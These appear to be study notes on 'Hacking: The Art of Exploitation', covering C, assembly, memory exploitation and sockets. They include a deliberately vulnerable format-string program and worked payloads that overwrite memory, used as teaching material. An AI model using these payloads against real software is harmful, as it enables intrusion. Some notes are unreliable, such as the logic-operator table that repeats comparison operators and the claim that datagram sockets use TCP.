# Art of Exploitation Notes
## x200 Programming
### C Basics
#### Key concepts/definitions to know:
- **Variables** - An object that can hold data
  - **Constant** - A type of variable that doesn't change
  - **Variable (Data) types**
    - **int** - stores whole numbers (2 or 4 bytes)
    - **float** - stores fractional digits can store up to 7 digits (4 bytes)
    - **char** - store single character (1 byte)
- **Pointers** - A variable that storesthe address of another variable as its value here are some key concepts as they apply to pointers and their **unary** operators
  - **Dereference/Pointer** (```*```)
    - When used in a declaration ```int* ptr``` it creates a pointer var
    - When used anywhere else is used to dereference (reference the value stored at a pointer location) ex: ```*ptr=10```
  - **Reference** (```&```) - Specifies address of a variable ex ```*ptr=&x```

- **Comments** - Comments are text in your code that do not run but should provide information about the intended use of the code, please use comments or you will forget how you did things, comments are denoted by the double backslash ```\\``` 

- **Control Structures** - Control structures are the statements that dictate the flow of execution of your code they include:
  - [**If, Else**](https://www.w3schools.com/c/c_conditions.php) - These statements dictate a decision that is made based on the result of a certain condition. ex:
    ```c
    if(you_understand_this){
        int gold_star_count = 1
    } 
    else(
        int click_if_else_hyperlink = 1
    )
    ```
    *note: despite what people tell you, use the braces ```{}``` in your if statements even if its only one line*
  - [**While**](https://www.w3schools.com/c/c_while_loop.php) - Keeps looping a block of code until a condition is reached ex:
    ```c
    while(you_dont_understand_this){
        click_while_hyperlink = 1
        you_dont_understand_this = 0
    }
    ```
    *note: always make sure to include something to trip the condition so you can exit the loop*
  - [**For**](https://www.w3schools.com/c/c_for_loop.php) - Used for when you want to execute a code block for a defined number of intervals ex:
    ```c
    for(iterator=0;iterator<5;iterator++){
        print("Printing this line")
    }
    ```
  - [**Break/Continue**](https://www.simplilearn.com/tutorials/cpp-tutorial/break-and-continue-statements-cpp) - Both can be used to exit a loop but the behavior is a bit different for each
    - Break: Stops the entire process of the loop
    - Continue: Only stops the current iteration 
- [**Functions**](https://www.w3schools.com/c/c_functions.php) - Used to perform a repetitive and uniform action multiple times with out rewriting code. The function is comprised of:
  - The prologue which includes function return type, name of function, and parameters ex:
    ```c
    void make_sandwich(char *bread, char *meat, char* cheese){
        //make the sandwich
    }
    ```
    *Note: The ```void``` data type is used in situations like this where you dont expect return data*  
  - The actual code you intent to execute, which should be nested within the brackets ```{}```
  - The return value, which is data you intend to pass back to the calling function. This will be denoted with the ```return``` keyword. *Note: please ensure your return value is the same type as your function prologue* 

- <details> 
    <summary><strong>Arithmetic operators</strong></summary>
    <strong>Arithmetic operators</strong> - Allows you to do mathematical operations on two operators
    <table class="tg">
    <thead>
    <tr>
        <th class="tg-g7sd">Full Expression</th>
        <th class="tg-yla0">Shorthand</th>
        <th class="tg-yla0">Explanation</th>
    </tr>
    </thead>
    <tbody>
    <tr>
        <td class="tg-cly1">i = i + 12</td>
        <td class="tg-cly1">i+=12</td>
        <td class="tg-cly1">Add some value to the variable.</td>
    </tr>
    <tr>
        <td class="tg-cly1">i = i - 12</td>
        <td class="tg-cly1">i-=12</td>
        <td class="tg-cly1">Subtract some value from the variable.</td>
    </tr>
    <tr>
        <td class="tg-cly1">i = i * 12</td>
        <td class="tg-cly1">i*=12</td>
        <td class="tg-cly1">Multiply some value by the variable.</td>
    </tr>
    <tr>
        <td class="tg-cly1">i = i / 12</td>
        <td class="tg-cly1">i/=12</td>
        <td class="tg-cly1">Divide some value from the variable.</td>
    </tr>
    </tbody>
    </table>
    </details>

- <details> 
    <summary><strong>Equivalency Operators</strong></summary>
    <strong>Equivalency Operators</strong> used to compare two operators ex:
    <table class="tg">
    <thead>
    <tr>
        <th class="tg-g7sd">Condition</th>
        <th class="tg-yla0">Symbol</th>
        <th class="tg-yla0">Example</th>
    </tr>
    </thead>
    <tbody>
    <tr>
        <td class="tg-cly1">Less than</td>
        <td class="tg-cly1">&lt;</td>
        <td class="tg-cly1">(a &lt; b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Greater than</td>
        <td class="tg-cly1">&gt;</td>
        <td class="tg-cly1">(a &gt; b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Less than or equal to</td>
        <td class="tg-cly1">&lt;=</td>
        <td class="tg-cly1">(a &lt;= b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Greater than or equal to</td>
        <td class="tg-cly1">&gt;=</td>
        <td class="tg-cly1">(a &gt;= b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Equal to</td>
        <td class="tg-cly1">==</td>
        <td class="tg-cly1">(a == b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Not equal to</td>
        <td class="tg-cly1">!=</td>
        <td class="tg-cly1">(a != b)</td>
    </tr>
    </tbody>
    </table>
    </details>

- <details>
    <summary><strong>Logic Operators</strong></summary>
    <strong >Logic Operators</strong> - used to chain together operators
    <table class="tg">
    <thead>
    <tr>
        <th class="tg-g7sd">Condition</th>
        <th class="tg-yla0">Symbol</th>
        <th class="tg-yla0">Example</th>
    </tr>
    </thead>
    <tbody>
    <tr>
        <td class="tg-cly1">Less than</td>
        <td class="tg-cly1">&lt;</td>
        <td class="tg-cly1">(a &lt; b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Greater than</td>
        <td class="tg-cly1">&gt;</td>
        <td class="tg-cly1">(a &gt; b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Less than or equal to</td>
        <td class="tg-cly1">&lt;=</td>
        <td class="tg-cly1">(a &lt;= b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Greater than or equal to</td>
        <td class="tg-cly1">&gt;=</td>
        <td class="tg-cly1">(a &gt;= b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Equal to</td>
        <td class="tg-cly1">==</td>
        <td class="tg-cly1">(a == b)</td>
    </tr>
    <tr>
        <td class="tg-cly1">Not equal to</td>
        <td class="tg-cly1">!=</td>
        <td class="tg-cly1">(a != b)</td>
    </tr>
    </tbody>
    </table>
    </details>

- **Typecasting** - Typecasting ig s way to temporarily change the tyoe of a variable ex: ```(float) [variable]```
    - Make sure to include an ```*``` after the type if youre typecasting a pointer because youre saying its a pointer to this var ex ```(int*) [pointer_variable]``` [ref](https://ecomputernotes.com/what-is-c/function-a-pointer/type-casting-of-pointers)

    - Doing arithmetic on typecasted pointers (assuming youre trying to effect the underlying value) is a bad idea unless you change it to the expected value first and then back to its typecasted self ex: ```int_pointer = (char *) ((int *) int_pointer + 1)```
        - void pointers must be typecasted before arithmetic
        - void pointers cant be de-referenced
- **User Input** 
  - ```scanf``` -  to include user input as a part of your program you will need to use this function, scanf expects its arguments to be pointers so you should either use one ot use a unary (address of) operator to a varable ```&``` ex ```scanf(%d, &[VARIABLE])```
    - if you want to grab user input but you also need spaces you can use a scanset char ```[]``` which says "read only" the trick is to combine with a not operator ```^``` to make it act as"read until" ex:  ```scanf("%[^\n]s", [variable])``` this will take all user input until a newline is sent into one string.   
  - **Via Args** - In order to take user input via arguments in C, you need to include two variables into your main function, (1) Your argument count (2) an arg list in a character array. ex ```int main(int argument_count, char *arg_list[])```
- **Variable Scoping** - it is important to understand the scope of your variables as they dictate what data is available to your current function during a specific point in execution there are 3 specific scopes you need to worry about:
  - **Global** - Global variables are variables defined outside of the main function that persist across all functions 
    - You can use the ```#define``` directive to set global constants
  - **Static** - They remain local to a specific function but their value remains intact across functions <details><summary>ex</summary>
        ```

        #include <stdio.h>

        int function()
        {
            static int count = 0;
            count++;
            return count;
        }

        void main(){
            print("%d", function);
            print("%d", function);
        }
        // will output 1 2 instead of 1 1
        ```
    </details>

  - **Local** - variable context is local to a function and is lost when the function leaves
  - **Structs** - these are kind of like classes in that they can hold multiple variables which can be held by a struct and referenced as such. Theres 3 different ways to access elements in a struct
    - The sensible way (Direct access): ```[Struct].[element]```
    - Via a pointer to the struct (arrow operator): ```[pointer]->[element]```
    - Typecasting the pointer then dereferencing the value out (assuming you know how the data is store in memory): ```*((int *) [pointer])```
  
#### Best Practices 
  - All of the primary functionality should be integrated in the ```main()``` function
  - add newlines at the end of your code to avoid include errors
  - always terminate statements with a ```;```
#### Things to remember
  - When the filename for a #include is surrounded by < and >, the compiler looks for this file in standard include paths, such as /usr/include/. If the filename is surrounded by quotes, the compiler looks in the current directory.
  - strings are just character arrays, to avoid having to add them one at a time, use strcpy ex ```strcpy([var], "Hello World!");``` but make sure that the string can fit in the allocated buffer for that variable (we'll talk more about why later)
  - ***Fortmat strings*** - in C you can use ```printf()``` to pring variables in a non-sting form ex: ```printf("Include example variable here: %s", [variable])```
    - ```%d``` Decimal
    - ```%u``` Unsigned decimal
    - ```%x``` Hexadecimal
    - ```%s``` String
    - ```%n``` Number of bytes written so far
    - ```%p```  Memory Address
- You can pad a number with 0s by prepending a format string with a number ex ```03%d```


### Assembly
All C programming is further translated to assembly code which is a lower level and somewhat human readable representation of the eventual machine code that is interpreted by the computer.
#### Key concepts/definition to know
- Assembly is syntax formatted ```operation, [destination], [source]``` 
- There are two major syntaxes for assembly, AT&T and Intel (Intel is a lot cleaner)
    - To set GDB to intel reference [GDB](https://github.com/adminprivileges/skillbridgreNotes/blob/main/terminal_tools.md#gdb)
- <details>
  <summary><strong>Registers</strong> - a register is a small bit of memory that sits inside the CPU. and is used by assembly language to perform various tasks. </summary>

    - ```EAX``` (Accumulator register): It is used for I/O port access, arithmetic, interrupt calls, etc
    - ```EBX``` (Base register): It is used as a base pointer for memory access. Gets some interrupt return values
    - ```ECX``` (Counter register): It is used as a loop counter and for shifts. Gets some interrupt values
    - ```EDX``` (Data register): It is used for I/O port access, arithmetic, some interrupt calls.
    - ```EDI``` (Destination index):Used for string, memory array copying and setting and for far pointer addressing with EDI
    - ```ESI``` (Source index): Used for string and memory array copying
    - ```EBP``` (Stack Base pointer): Holds the base address of the stack
    - ```ESP``` (Stack pointer): Holds the top address of the stack
    - ```EIP``` (Index Pointer): Holds the offset of the next instruction. It can only be read
  </details>

- x86 processor values are stored in little-endian (least sig byte first) byte order which means the byte values ```0xc7    0x45    0xfc    0x00``` would be stored in a word as ```0x00fc45c7```

- <details>
    <summary>Compiled program memory is broken into 5 segments:</summary>
    - **Text:** (Code Segment), where the assembly instructions are located. 
        - Read Only

    - **Data:** used to store initialized global and static variables
        - Writable, but fixed in size
    - **BSS:**  used for uninitialized g&s variables
        - Writable, but fixed in size
    - **Heap:** directly controlled by the programmer, writes downward towards higher memory addresses
      - ```malloc()``` and ```free()``` are used to allocate and deallocate space in the heap respectively
        - malloc returns a pointer with the datatype void so it must be typecasted to its expected type
    - **Stack:** used to store local function variables and context during function calls (what ```bt``` looks at) grows upards towards lower memory
  </details>
- **Function Calls** - function calls have three important parts which are the **function prologue**, the **function call** and the **function epilogue**  
  - **Function Prologue**:
    - Pushes EBP to the stack so that it can be restored to its place in the calling function later ```push ebp```
    - The value of the base pointer is set to the address of the ESP (top of the stack) ```mov ebp, esp```
    - ESP gets moved to create memory space for the local variables ```sub esp, 15``` 
  - **Function call**:
    - pushes the function arguments to the stack (in reverse order)
    - Pushes return address (the next instruction) to the stack 
  - **Function epilogue**  
    - Drops stack pointer to the base pointer ```mov esp, ebp```
    - pops base pointer off the stack to be restored to its previous value ```pop ebp```
    - calls the return function which places the return address in EIP to run it next ```ret```
  - ![Stack](https://learning.oreilly.com/api/v2/epubs/urn:orm:book:9781593271442/files/httpatomoreillycomsourcenostarchimages254229.png.jpg)
#### Things to remember
- As a program executes, the EIP is set to the first instruction in the text segment. The processor then follows an execution loop that does the following:
  - Reads the instruction that EIP is pointing to
  - Adds the byte length of the instruction to EIP
  - Executes the instruction that was read in step 1
  - Goes back to step 1

### File I/O
In C files are handled by 2 different ways file descriptors and file streams. File descriptors are the preferred method as they use lower level I/O functions. 
- There are four common functions that use file descriptors 
  - ```open()```: Opens a file and returns file descriptor
    - requires ```<fcntl.h>``` and ```<sys/stat.h>``` to be included to use flags
    - Open flags include:
      - ```O_RDONLY``` Open file for read-only access.
      - ```O_WRONLY``` Open file for write-only access.
      - ```O_RDWR``` Open file for both read and write access.
      - ```O_APPEND``` Write data at the end of the file.
      - ```O_TRUNC``` If the file already exists, truncate the file to 0 length.
      - ```O_CREAT``` Create the file if it doesn't exist.
        - ```S_IRUSR``` Give the file read permission for the user (owner).
        - ```S_IWUSR``` Give the file write permission for the user (owner).
        - ```S_IXUSR``` Give the file execute permission for the user (owner).
        - ```S_IRGRP``` Give the file read permission for the group.
        - ```S_IWGRP``` Give the file write permission for the group.
        - ```S_IXGRP``` Give the file execute permission for the group.
        - ```S_IROTH``` Give the file read permission for other (anyone).
        - ```S_IWOTH``` Give the file write permission for other (anyone).
        - ```S_IXOTH``` Give the file execute permission for other (anyone).
  - ```close()```: fd is the only arg
  - ```read()```: 
  - ```write()```: combine with int (usually ```strlen``` to know how much to write) 

## x300 Exploitation
### Buffer Overflow
#### Key concepts/definitions to know
- **Buffer Overflow** - When data written into a buffer (an allocation of memory) overides the boundaries of said buffer and spills into adjacent memory locations.
  - When data is overwritten it flows to higher addresses (remember, the stack grows to lower addresses)
- In a function, since data is placed on the stack in reverse order, variables defined before other variables are susceptible to being overwritten.
  - <details><summary>ex:</summary>
    ```c
    void main(){
      int var1;
      char var2[20];
    }
    ```
    *Note: In this scenario, if more than 20 bytes are written into the var2 character buffer, the remainder could overflow into var 1*
    </details>

- Because of this same concept, the lack of input validation can also lead to execution flow control if a hacker can overflow user-defined data into the return address
  - ![pic](https://www.mkdynamics.net/current_projects/computer_security/images/Basic_Linux_exploits/buffer_overflow_image.jpeg) 
  - When overflowing a buffer, there are two ways you can find the offset from the variable you control to the return address. You can 
    - Use an ever growing input repeating your return address until youre sucessful (Easier with command line argument stuff).
    - Use ```msf-pattern-create``` to make a unique byte array to overflow your return address and then ```msf-pattern_offset``` to find the specific size (Easier if your debugging info is more robust)
      - <details>
  
        ```bash
        msf-pattern_create -l 800 #will create a 800m byte buffer
        msf-pattern_offset -l 800 -q [RETURN_POINTER_VALUE] #will take the value from your return pointer ant tell you the offset from your variable
        ```
        </details>
- The ```strcpy()``` function alone does not institute input validation, and without it can make programs susceptible to overflow attacks
### NOP Sleds
- One of the most famous types of a buffer overflow exploit is the NOP (No Operation) Sled. In this technique, the hacker tries to land the return address to a range of memory addresses that feed sequentially into desired shellcode. Check out [this](https://www.coengoedegebure.com/buffer-overflow-attacks-explained/) link for a full rundown.
- There Are three major parts to this exploit all equally as important.
![exploit](https://learning.oreilly.com/api/v2/epubs/urn:orm:book:9781593271442/files/httpatomoreillycomsourcenostarchimages254213.png.jpg)
  - **NOP Sled** - A single byte assembly instruction that does absolutley nothing and pushes you to the next instruction.
  ![Sled](https://www.coengoedegebure.com/content/images/2018/08/nopsled_slide.png)
  - **Shell Code** - These can come in all different flavors, but by in large they are some form of command line invocation (usually just executes /bin/sh)
  - **Return Address** - The return address redirects the executino flow to land somewhere within the NOP sled.  
- While predicting a location in memory to point to in order to hop on the sled can be a bit difficult with a dynamically changing stack, one trick is to use a predictable memory location such as th address of a function call argument (since these will always be before the rest of the stack frame, just make sure your sled isnt big enough to override these too) and subtract an offset in order to find a spot within the sled, this may take trial and error but you can automate it with a bit of scripting. ex:
  - ``` 
    ret = (unsigned int) &i - offset; // Set return address.
    ```
### Environmental Variables
- In some situations you may be dealing with a buffer that is too small for you to include a large NOP sled and  in the offset between your variable and the return pointer. In this case we have to be a bit more cognizant about the space we occupy. Thankfully shellcode can be placed in more locations than just the stack frame of this particular function.
- It is important to note that user environment variables are stored on the stack as well and when a program is run under the context of a specific user (even if it has suid root privileges) the stack will contain that specific users environment variables, this location is static but can shift a bit given certain factors such as the program's name
  -  To combat this, you can either use a NOP sled, or predict where this location will be. Thankfully this is easier with the ```getenv()``` function (with a few tweaks) 
     -  <details> <summary>getenvaddr.c</summary>
        
        ```c
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>

        int main(int argc, char *argv[]) {
          char *ptr;

          if(argc < 3) {
              printf("Usage: %s <environment var> <target program name>\n", argv[0]);
              exit(0);
          }
          ptr = getenv(argv[1]); /* Get env var location. */
          ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
          printf("%s will be at %p\n", argv[1], ptr);
        }
        ```
        *Note: There is a two byte difference in environmental variable location per one byte of program name increase*
      </details>

### Heap Overflows
- The main thing of note in heap based overflow attacks is that these are going to be largely focused on overriding certain variables to control program functionality rather than execution flow.
  - This simply means that the end goal of the exploits are going to be largely dependant on the functionality of thr program. 
-  In the context of this book, while the heap may be dynamically allocated, variables that reside int he heap are sequential in nature and can be overwritten into one another.  
-  Since the heap grows Higher into increased memory addresses, variables overflow in the order in which they are initialized in the program. 
### Function Pointer Overflow
- Function pointers, like any other variable can be overflowed, when a function pointer is referenced in a variable initialization in something like a struct, or even another function, the rules of regular buffer overflow still apply, if you can find the offset of the two variables and use input to overflow and override  a function pointer, you can control execution flow when it comes time for that function pointer to be referenced.
- ```nm``` can be used to list the addresses of various functions in a program in case you want to call a seperate function versus using shellcode. 
### Format Strings
We reference format strings [earlier](https://github.com/adminprivileges/skillbridgreNotes#things-to-remember) in the notes, but what we fail to mention is the fact that ther are stored alongside the variable in the stack when a ```printf()``` function is called. To learn more about this, check out [this link](https://axcheron.github.io/exploit-101-format-strings/) . 
- Since format strings are stored on the stack, if proper input control validation isn't exercised, then the address of the format string can be overflowed leading to arbirtary memory read and write capabilities.
- Similar to ```scanf()```, ```printf``` has the ability to be abused to allow for overflow without proper input validation. 
  - The biggest countermeasure for this is to only accept input in the form of a format string to ensure that ```printf()``` interprets the totality of the argument it is sent as one contiguous string. This is done by using ```printf(%, [VARIABLE])``` instead of ```printf([VARIABLE])``` .
    - <details><summary>fmt_vuln.c</summary>

        ```c
        #include <stdio.h>
        #include <stdlib.h>
        #include <string.h>

        int main(int argc, char *argv[]) {
          char text[1024];
          static int test_val = -72;

          if(argc < 2) {
              printf("Usage: %s <text to print>\n", argv[0]);
              exit(0);
          }
          strcpy(text, argv[1]);

          printf("The right way to print user-controlled input:\n");
          printf("%s", text);


          printf("\nThe wrong way to print user-controlled input:\n");
          printf(text);

          printf("\n");

          // Debug output
          printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, 
        test_val);

          exit(0);
        }
        ```
    </details>

    - <details> <summary>example output</summary>

        ```
        reader@hacking:~/booksrc $ ./fmt_vuln testing %x
        The right way to print user-controlled input:
        testing%x
        The wrong way to print user-controlled input:
        testingbffff3e0
        ```
        *Note: In the same way that ```testing %x``` can be used to examine the next memory address, this can be repeated indefinitely to read stack memory*
    </details>
#### Writing to a buffer
- Just like data can be read from memory using format strings, it can be written using them as well. The ```%n``` format string is used to write the ammount of bytes written so far. If we can influence the data written so far, we can effectively write to a memory address that we control, the intended variable.
  - In order to find the offset from the the format string buffer to tthe intended variable you can place a predictable string (like AAAA) and pair it with a multitude of repeated format strings (```%x```) until  
- Data can be written to our intended variable in one of two ways
  - Manipulating the field width of your format strings for 4 consecutive writes, using regular format strings that reference sequential bits of memory with 4 byte offsets. Unfortunately you can only influence one byte at a time with this method resulting in you having to run the program 4 times back to back slowly incrementing the memory address. All in all, the operation will look something like this (for 4 times):
    - <details>
    
      ```
      reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x94\x97\x04\x08JUNK\x95\x97\x04\x08JUNK\x96\x97\x04\x08JUNK\x97\x97\x04\x08")%x%x%126x%n
      The right way to print user-controlled input:
      ??JUNK??JUNK??JUNK??%x%x%126x%n
      The wrong way to print user-controlled input:
      ??JUNK??JUNK??JUNK??bffff3c0b7fe75fc
      0
      [*] test_val @ 0x08049794 = 170 0x000000aa 
      ```
    </details>
  - Using Direct parameter access to simplify the above method for simpler, single execution writes (which i do understand so im going to explain).
    -  <details><summary>Reading</summary>

          Its a bit easier to explain writing if i explain reading first. In the same  way that ```./fmt_vuln AAAA%x%x%x%x``` can read ```AAAA...41414141```, ```./fmt_vuln AAAA%4\$x``` can be used to read ```AAAA41414141``` it does so by asking for the Nth occurence of a sequence with the special character ```$``` (which needs to be escaped since we are using this in the context of bash as an argument. ```%4/$x == %4$x```  which translates to the 4th occuence of the 4 byte hexadecimal sequence. 
          ```
          reader@hacking:~/booksrc $ ./fmt_vuln AAAA%x%x%x%x
          The right way to print user-controlled input:
          AAAA%x%x%x%x
          The wrong way to print user-controlled input:
          AAAAbffff3d0b7fe75fc041414141
          [*] test_val @ 0x08049794 = -72 0xffffffb8
          reader@hacking:~/booksrc $ ./fmt_vuln AAAA%4\$x
          The right way to print user-controlled input:
          AAAA%4$x
          The wrong way to print user-controlled input:
          AAAA41414141
          [*] test_val @ 0x08049794 = -72 0xffffffb8 
          reader@hacking:~/booksrc $
          ```

       </details>
    - Writing: To write data you must first read the data inside the memory address you would like to write too, you can do so by effectivey "zeroing" (or as close to it) the value, and then doing a little bit of math to rewrite the address.
      - <details><summary>Ex</summary>

          Using the example from the book. The intent is to change the address of tets_val to ```0xbffffd72```. First we hav to clear our the current value. 
          ```c
          reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08". "\x96\x97\x04\x08" . "\x97\x97\x04\x08"')%4\$n
          The right way to print user-controlled input:
          ????????%4$n
          The wrong way to print user-controlled input:
          ????????
          [*] test_val @ 0x08049794 = 16 0x00000010

          ```
          This changes overrides the memory location and changes the value to 16 bytes which is the value of the 4 words. Next we can do some math to calculate the number of bits that need to be written for each byte of the memory address. This is done by starting with the 16 bytes and then calculating the offsets for each following byte via subtraction
          ```
          reader@hacking:~/booksrc $ gdb -q
          (gdb) p 0x72 - 16
          $1 = 98
          (gdb) p 0xfd - 0x72
          $2 = 139
          (gdb) p 0xff - 0xfd
          $3 = 2
          (gdb) p 0x1ff - 0xfd
          $4 = 258
          (gdb) p 0xbf - 0xff
          $5 = -64
          (gdb) p 0x1bf - 0xff
          $6 = 192
          (gdb) quit
          ```
          With these offsets in mind, starting with ```%98x%4\$n``` we should be able to build a string that will override the entire memory address in one call.that will look something like
          ```
          reader@hacking:~/booksrc $ ./fmt_vuln $(perl -e 'print "\x94\x97\x04\x08" . "\x95\x97\x04\x08". "\x96\x97\x04\x08" ."\x97\x97\x04\x08"')%98x%4\$n%139x%5\$n%258x%6\$n%192x%7\$n
          The right way to print user-controlled input:
          ????????%98x%4$n%139x%5$n%258x%6$n%192x%7$n
          The wrong way to print user-controlled input:
          ???????? 
                                                                          bffff3b0
                                                          b7fe75fc
                                      0
                                            8049794
          [*] test_val @ 0x08049794 = -1073742478 0xbffffd72
          ```
        </details>   

### Destructors (.dtors)
In C objects (to include functions like main) are paired with constructors and destructors which allocate and release resources when objects come in and out of scope. If these are not user defined, the compiler will simply choose the defaults. Functions can be defined as destructors by specifying the attribute in the function prototype ex: 
```c
static void cleanup(void) __attribute__ ((destructor));
```
Using the ```nm``` command, we can inspect the destructors, the addresses to these functions are stored sequentially in the stack, beginning at ```__DTOR_LIST__``` and ```__DTOR_END__``` these addresses should hold the values of```0x00000000``` and ```0xffffffff``` respectively. If no user defined destructors exist, these memory addresses will only be 4 bytes apart, otherwise a pointer to a user defined destructor will reside here. *Note: you can also use ```objdump``` to just print the destructor table.
```
reader@hacking:~/booksrc $ objdump -s -j .dtors ./fmt_vuln

./fmt_vuln:     file format elf32-i386

Contents of section .dtors:
 8049690 ffffffff 00000000 
```
It is important to note that the destructors table is writable (if you want to fact check me, run a ```objdump -h``` on a file and notice the lack of a READONLY attribute) given this fact if we have a program that runs under root privileges we can combine this with other techniques such as format string/buffer overflow exploits to control execution flow.
### Global Offset table
The global offset table along eith the procedure linkage table are used to convert position independent addresses to absolute locations (or in engligh it stores dynamic memory locations in static predictable pointers). This is important to understand because this is how programs reference essential functions such as ```exit()```. More importantly, the GOT is writable, which means again, we can influence program execution flow if we override these pointers. To inspect the address of these pointers you can inspect dynamic resolution entries of the GOT using ```objdump``` ex:
```
reader@hacking:~/booksrc $ objdump -R ./fmt_vuln

./fmt_vuln:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049764 R_386_GLOB_DAT    __gmon_start__
08049774 R_386_JUMP_SLOT   __gmon_start__
08049778 R_386_JUMP_SLOT   __libc_start_main
0804977c R_386_JUMP_SLOT   strcpy
08049780 R_386_JUMP_SLOT   printf
08049784 R_386_JUMP_SLOT   exit
```

## x400

### OSI Model
In oder for computers to be able to talk to one another, they need tp speak the same language. Due to the million different reasons that computers need to talk to each other there are another million protocols to somewhat uniformly control how the communications traverse across networks. 

In order to make this more modular the OSI model was created as a conceptual model for these standards to adhere to in order to facilitate information flow. This model is made of 7 layers as follows:
1. **Physical Layer** - Deals with transmitting a raw bit stream over a physical medium (turning something like light or electricity into data).  
   - Devices at this layer include cables like coax and fiber, but can also be frequencies and EM pulses for wireless communications  
2. **Data Link Layer** - Deals with transferring data from one device to another in frames within a broadcast domain. Error checking and flow control are added at this layer to make dataflow practical in modern application (focuses on getting information from one device to its neighbor). 
   - Devices at this layer include switches. 
3. **Networking Layer** - Deals with connecting broadcast domains to one another to facilitate wide area networks (makes big networks out of smaller networks).
   - Devices at this layer include routers  
4. **Transport Layer** - deals with enabling reliable networks, ensures complete data transfers and provides additions such as volume and rate control (helps data move more efficiently). 
5. **Session Layer** - Deals with maintaining sessions between networked applications (controls the conversation). 
6. **Presentation Layer** - responsible for ensuring the data is presented in a usable format, also where encryption happens
7. **Application Layer** - Allows applications to access networked services. 
When your data is moved over the internet, layers 1-3 facilitate actually getting your data from point a to point b. Layers 4-7 enable the underlying communication between the computers to occur in a uniform fashion.   
## Sockets
### Key concepts/definitions to know
- **Sockets** - the pairing of an IP address with a Port, or otherwise a connection endpoint. This happens at layer 5 although it influences the structure of layer 4. 
- There are two kinds of sockets
  - Stream Sockets: Used for TCP
  - Datagram Sockets: Used for TCP
- A socket behaves a lot like a file descriptor, and can be interacted with using ```read()```  and ```write()``` a function to create a socket fd looks like this:
  - ```
    socket(int domain, int type, int protocol)
    ```
    - ```domain``` - protocol family of the socket (ex: ```pf_inet, pf_ax25```)
    - ```type``` - type of socket (ex: ```sock_stream, sock_dgram```)
    - ```protocol``` - choose a protocol within the family (most families only have 1 so this is usually set to ```0```)
- **Connecting** sockets is done via pairing the descriptor created in the function above with a remote host. The function to do so looks like this:
  - ```
     connect(int fd, struct sockaddr *remote_host, socklen_t addr_length) 
    ```
    *Note: ```socklen_t``` is a data type for an unsigned 32bit int for a network address*
-  **Binding** sockets is done via pairing a sockets with a local address in order to listen to connections. The function looks like this:
   -  ```
        bind(int fd, struct sockaddr *local_addr, socklen_t addr_length)
      ``` 
    - To **listen** for connections you must use the following function, which ques requests up to ```backlog_queue_size```
      - ```
          listen(int fd, int backlog_queue_size)
        ```
    - To **accept** a connectiona bound socket must be paired with a remote host as well as the size off the address structture 
      - ```
          accept(int fd, sockaddr *remote_host, socklen_t *addr_length)
        ```
  - Sending and recieving are done via similar functions using the socket fd where ```n``` is the number of bytes sent or recieved
    - ```
      send(int fd, void *buffer, size_t n, int flags)
      recv(int fd, void *buffer, size_t n, int flags)
      ```
    
  - All of these functions should return a ```-1``` if an error occurs which can be used in an if statement for error checking if the output is ```== -1```
  - Many of these functions reference a ```sockaddr``` struct. This struct contains the infomration necessary to define a host given that there are many different ways a single host can be addressed depending on the protocol
     - ```SOCKADDR_COMMON``` is an unsigned int used to represent the family of addresses along with the rest of the strcture for its saved data .
     - These different sockaddr structures are all the same size allowing for them to be typecasted into one another. 
### AF_INET
- ```AF_INET``` is the address family under the ```PF_INET``` protocol family, Together this pair reporesent IPv4. THe address structure shown in the ```netinet/in.h``` file is as shown
  - ```
      /* Structure describing an Internet socket address.  */
      struct sockaddr_in
        {
          __SOCKADDR_COMMON (sin_);
          in_port_t sin_port;     /* Port number.  */
          struct in_addr sin_addr;    /* Internet address.  */

          /* Pad to size of 'struct sockaddr'.  */
          unsigned char sin_zero[sizeof (struct sockaddr) -
              __SOCKADDR_COMMON_SIZE -
              sizeof (in_port_t) -
              sizeof (struct in_addr)];
         };
    ```
    - ```SOCKADDR_COMMON``` in this context defines our address family (IPv4)
    - Next is the port which is a 16 bit short between 0-FFFF
    - next is a 32 bit IP address
    - Lastly, 8 bits pad out the rest of the address

  - The port number and IP in ```AF_INET``` are expected to be in big endian (regardless of architecture) and there are functions that can be used to convert this such as ```htonl``` (Host to network long)
  - 